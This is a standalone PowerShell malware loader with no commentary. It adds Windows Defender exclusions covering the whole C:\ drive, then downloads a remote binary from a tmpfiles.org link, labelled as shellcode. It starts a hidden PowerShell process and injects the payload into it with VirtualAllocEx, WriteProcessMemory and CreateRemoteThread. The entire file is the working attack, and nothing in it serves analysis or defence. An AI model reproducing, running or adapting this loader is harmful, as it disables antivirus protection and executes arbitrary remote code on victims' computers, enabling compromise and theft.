Add-MpPreference -ExclusionProcess "ntoskrnl.exe"
Add-MpPreference -ExclusionExtension ".ext"
Add-MpPreference -ExclusionPath "C:\"

$shellcodeUrl = "https://tmpfiles.org/dl/2556279/ntoskrnl1.bin"
$tempShellcode = "$env:TEMP\payload.bin"

try {
    Invoke-WebRequest -Uri $shellcodeUrl -OutFile $tempShellcode -UseBasicParsing
} catch {
    exit
}

Add-Type -TypeDefinition @"
using System;
using System.Diagnostics;
using System.Runtime.InteropServices;

public class Injector {
    [DllImport("kernel32.dll")] public static extern IntPtr OpenProcess(int access, bool inherit, int pid);
    [DllImport("kernel32.dll")] public static extern IntPtr VirtualAllocEx(IntPtr h, IntPtr addr, uint size, uint type, uint protect);
    [DllImport("kernel32.dll")] public static extern bool WriteProcessMemory(IntPtr h, IntPtr addr, byte[] buf, int size, out int written);
    [DllImport("kernel32.dll")] public static extern IntPtr CreateRemoteThread(IntPtr h, IntPtr attr, uint stack, IntPtr start, IntPtr param, uint flags, IntPtr id);
    [DllImport("kernel32.dll")] public static extern bool CloseHandle(IntPtr h);
}
"@

$p = Start-Process -FilePath "powershell.exe" -WindowStyle Hidden -PassThru
Start-Sleep -Milliseconds 500

$shellcode = [System.IO.File]::ReadAllBytes($tempShellcode)
$targetPID = $p.Id
$hProc = [Injector]::OpenProcess(0x1F0FFF, $false, $targetPID)

if ($hProc -eq [IntPtr]::Zero) {
    exit
}

$addr = [Injector]::VirtualAllocEx($hProc, [IntPtr]::Zero, $shellcode.Length, 0x1000, 0x40)
[void][Injector]::WriteProcessMemory($hProc, $addr, $shellcode, $shellcode.Length, [ref]0)
[void][Injector]::CreateRemoteThread($hProc, [IntPtr]::Zero, 0, $addr, [IntPtr]::Zero, 0, [IntPtr]::Zero)
[void][Injector]::CloseHandle($hProc)
